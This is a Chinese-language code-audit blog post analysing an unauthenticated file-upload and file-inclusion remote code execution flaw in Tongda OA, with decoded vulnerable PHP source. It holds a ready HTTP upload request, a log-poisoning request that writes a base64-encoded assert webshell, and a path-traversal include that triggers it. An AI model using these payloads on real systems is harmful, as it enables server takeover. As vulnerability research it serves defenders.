---
title: "通达OA 任意文件上传配合文件包含导致RCE"
date: 2020-03-18T21:04:03+08:00
draft: false
tags:
- PHP
- RCE
series:
-
categories:
- 代码审计
---

昨晚爆出来，今天早上分析分析。
<!--more-->
## 复现
```
POST /ispirit/im/upload.php HTTP/1.1
Host: 192.168.124.138
Content-Length: 463
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTfafXJtEseBHh3r1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: KEY_RANDOMDATA=3656; PHPSESSID=Y4er
Connection: close

------WebKitFormBoundaryTfafXJtEseBHh3r1
Content-Disposition: form-data; name="ATTACHMENT"; filename="1.png"
Content-Type: application/octet-stream

<?php echo 'Y4er';
------WebKitFormBoundaryTfafXJtEseBHh3r1
Content-Disposition: form-data; name="P"

Y4er
------WebKitFormBoundaryTfafXJtEseBHh3r1
Content-Disposition: form-data; name="DEST_UID"

12
------WebKitFormBoundaryTfafXJtEseBHh3r1
Content-Disposition: form-data; name="UPLOAD_MODE"

1

```
![image](https://y4er.com/img/uploads/20200318213312.png)

先上传文件，然后文件包含

![image](https://y4er.com/img/uploads/20200318211780.png)

## 文件上传
代码是zend加密的，百度一搜一大把解密。

文件上传的代码
```php
<?php
//decode by http://dezend.qiling.org  QQ 2859470

set_time_limit(0);
$P = $_POST['P'];
if (isset($P) || $P != '') {
    ob_start();
    include_once 'inc/session.php';
    session_id($P);
    session_start();
    session_write_close();
} else {
    include_once './auth.php';
}
include_once 'inc/utility_file.php';
include_once 'inc/utility_msg.php';
include_once 'mobile/inc/funcs.php';
ob_end_clean();
$TYPE = $_POST['TYPE'];
$DEST_UID = $_POST['DEST_UID'];
$dataBack = array();
if ($DEST_UID != '' && !td_verify_ids($ids)) {
    $dataBack = array('status' => 0, 'content' => '-ERR ' . _('接收方ID无效'));
    echo json_encode(data2utf8($dataBack));
    exit;
}
if (strpos($DEST_UID, ',') !== false) {
} else {
    $DEST_UID = intval($DEST_UID);
}
if ($DEST_UID == 0) {
    if ($UPLOAD_MODE != 2) {
        $dataBack = array('status' => 0, 'content' => '-ERR ' . _('接收方ID无效'));
        echo json_encode(data2utf8($dataBack));
        exit;
    }
}
$MODULE = 'im';
if (1 <= count($_FILES)) {
    if ($UPLOAD_MODE == '1') {
        if (strlen(urldecode($_FILES['ATTACHMENT']['name'])) != strlen($_FILES['ATTACHMENT']['name'])) {
            $_FILES['ATTACHMENT']['name'] = urldecode($_FILES['ATTACHMENT']['name']);
        }
    }
    $ATTACHMENTS = upload('ATTACHMENT', $MODULE, false);
    if (!is_array($ATTACHMENTS)) {
        $dataBack = array('status' => 0, 'content' => '-ERR ' . $ATTACHMENTS);
        echo json_encode(data2utf8($dataBack));
        exit;
    }
    ob_end_clean();
    $ATTACHMENT_ID = substr($ATTACHMENTS['ID'], 0, -1);
    $ATTACHMENT_NAME = substr($ATTACHMENTS['NAME'], 0, -1);
    if ($TYPE == 'mobile') {
        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), 'utf-8', MYOA_CHARSET);
    }
} else {
    $dataBack = array('status' => 0, 'content' => '-ERR ' . _('无文件上传'));
    echo json_encode(data2utf8($dataBack));
    exit;
}
$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);
if (!$FILE_SIZE) {
    $dataBack = array('status' => 0, 'content' => '-ERR ' . _('文件上传失败'));
    echo json_encode(data2utf8($dataBack));
    exit;
}
if ($UPLOAD_MODE == '1') {
    if (is_thumbable($ATTACHMENT_NAME)) {
        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);
        $THUMB_FILE_PATH = substr($FILE_PATH, 0, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . 'thumb_' . $ATTACHMENT_NAME;
        CreateThumb($FILE_PATH, 320, 240, $THUMB_FILE_PATH);
    }
    $P_VER = is_numeric($P_VER) ? intval($P_VER) : 0;
    $MSG_CATE = $_POST['MSG_CATE'];
    if ($MSG_CATE == 'file') {
        $CONTENT = '[fm]' . $ATTACHMENT_ID . '|' . $ATTACHMENT_NAME . '|' . $FILE_SIZE . '[/fm]';
    } else {
        if ($MSG_CATE == 'image') {
            $CONTENT = '[im]' . $ATTACHMENT_ID . '|' . $ATTACHMENT_NAME . '|' . $FILE_SIZE . '[/im]';
        } else {
            $DURATION = intval($DURATION);
            $CONTENT = '[vm]' . $ATTACHMENT_ID . '|' . $ATTACHMENT_NAME . '|' . $DURATION . '[/vm]';
        }
    }
    $AID = 0;
    $POS = strpos($ATTACHMENT_ID, '@');
    if ($POS !== false) {
        $AID = intval(substr($ATTACHMENT_ID, 0, $POS));
    }
    $query = 'INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values (\'' . date('Y-m-d H:i:s') . '\',\'' . $_SESSION['LOGIN_UID'] . '\',\'' . $DEST_UID . '\',\'*' . $ATTACHMENT_ID . '.' . $ATTACHMENT_NAME . '\',\'' . $FILE_SIZE . '\',\'0\',\'' . $AID . '\')';
    $cursor = exequery(TD::conn(), $query);
    $FILE_ID = mysql_insert_id();
    if ($cursor === false) {
        $dataBack = array('status' => 0, 'content' => '-ERR ' . _('数据库操作失败'));
        echo json_encode(data2utf8($dataBack));
        exit;
    }
    $dataBack = array('status' => 1, 'content' => $CONTENT, 'file_id' => $FILE_ID);
    echo json_encode(data2utf8($dataBack));
    exit;
} else {
    if ($UPLOAD_MODE == '2') {
        $DURATION = intval($_POST['DURATION']);
        $CONTENT = '[vm]' . $ATTACHMENT_ID . '|' . $ATTACHMENT_NAME . '|' . $DURATION . '[/vm]';
        $query = 'INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES (\'' . $_SESSION['LOGIN_UID'] . '\', \'' . $CONTENT . '\', \'' . time() . '\')';
        $cursor = exequery(TD::conn(), $query);
        echo '+OK ' . $CONTENT;
    } else {
        if ($UPLOAD_MODE == '3') {
            if (is_thumbable($ATTACHMENT_NAME)) {
                $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);
                $THUMB_FILE_PATH = substr($FILE_PATH, 0, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . 'thumb_' . $ATTACHMENT_NAME;
                CreateThumb($FILE_PATH, 320, 240, $THUMB_FILE_PATH);
            }
            echo '+OK ' . $ATTACHMENT_ID;
        } else {
            $CONTENT = '[fm]' . $ATTACHMENT_ID . '|' . $ATTACHMENT_NAME . '|' . $FILE_SIZE . '[/fm]';
            $msg_id = send_msg($_SESSION['LOGIN_UID'], $DEST_UID, 1, $CONTENT, '', 2);
            $query = 'insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values (\'' . date('Y-m-d H:i:s') . '\',\'' . $_SESSION['LOGIN_UID'] . '\',\'' . $DEST_UID . '\',\'*' . $ATTACHMENT_ID . '.' . $ATTACHMENT_NAME . '\',\'' . $FILE_SIZE . '\',\'0\')';
            $cursor = exequery(TD::conn(), $query);
            $FILE_ID = mysql_insert_id();
            if ($cursor === false) {
                echo '-ERR ' . _('数据库操作失败');
                exit;
            }
            if ($FILE_ID == 0) {
                echo '-ERR ' . _('数据库操作失败2');
                exit;
            }
            echo '+OK ,' . $FILE_ID . ',' . $msg_id;
            exit;
        }
    }
}
```

关键点在于
![image](https://y4er.com/img/uploads/20200318211110.png)

POST提交P参数，就不会引入auth.php，进而绕过登陆。

![image](https://y4er.com/img/uploads/20200318218839.png)

然后就是需要传一个DEST_UID参数来过exit，只要不为0或空的数字都可以。然后就可以走到upload函数了，接下来如果`$UPLOAD_MODE == '1'`就会把`ATTACHMENT_ID`输出出来，这个id其实就是我们马的文件名，但是因为不在web目录，所以需要一个文件包含。

## 文件包含
代码
```php
<?php
//decode by http://dezend.qiling.org  QQ 2859470

ob_start();
include_once 'inc/session.php';
include_once 'inc/conn.php';
include_once 'inc/utility_org.php';
if ($P != '') {
    if (preg_match('/[^a-z0-9;]+/i', $P)) {
        echo _('非法参数');
        exit;
    }
    session_id($P);
    session_start();
    session_write_close();
    if ($_SESSION['LOGIN_USER_ID'] == '' || $_SESSION['LOGIN_UID'] == '') {
        echo _('RELOGIN');
        exit;
    }
}
if ($json) {
    $json = stripcslashes($json);
    $json = (array) json_decode($json);
    foreach ($json as $key => $val) {
        if ($key == 'data') {
            $val = (array) $val;
            foreach ($val as $keys => $value) {
                ${$keys} = $value;
            }
        }
        if ($key == 'url') {
            $url = $val;
        }
    }
    if ($url != '') {
        if (substr($url, 0, 1) == '/') {
            $url = substr($url, 1);
        }
        include_once $url;
    }
    exit;
}
```
这里不传P参数就能绕过exit了，然后走到下面的include_once进行文件包含造成RCE。

## 坑
我的环境是通达oa2017，2020/03/18从官网下的。php.ini默认禁用了`disable_functions = exec,shell_exec,system,passthru,proc_open,show_source,phpinfo`，不知道其他版本是什么情况。参考使用com组件绕过disable_function

通达OA之前报过变量覆盖的洞，所以你要知道直接传入的参数就会被覆盖掉变量里，这也是上面UPLOAD_MODE、P、DEST_UID可以直接传入的原因。

有些版本gateway.php路径不同，例如2013：
```
/ispirit/im/upload.php
/ispirit/interface/gateway.php
```
例如2017：
```
/ispirit/im/upload.php
/mac/gateway.php
```

2015没有文件包含，官方给的补丁2017的没有修复文件包含，所以还有很多种包含日志文件getshell的姿势，不一定要文件上传。
```
http://192.168.124.138/api/ddsuite/error.php
POST:message=<?php file_put_contents("2.php",base64_decode("PD9waHAgYXNzZXJ0KCRfUE9TVFsxXSk7Pz4="));?>52011 
```
然后包含
```
http://192.168.124.138/mac/gateway.php
POST:json={"url":"..\/..\/logs\/oa\/2003\/dd_error.log"}
```
在`http://192.168.124.138/mac/2.php`就是shell密码1

## 参考链接
- http://www.tongda2000.com/news/673.php
- http://club.tongda2000.com/forum.php?mod=viewthread&tid=128377
- https://github.com/jas502n/OA-tongda-RCE

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**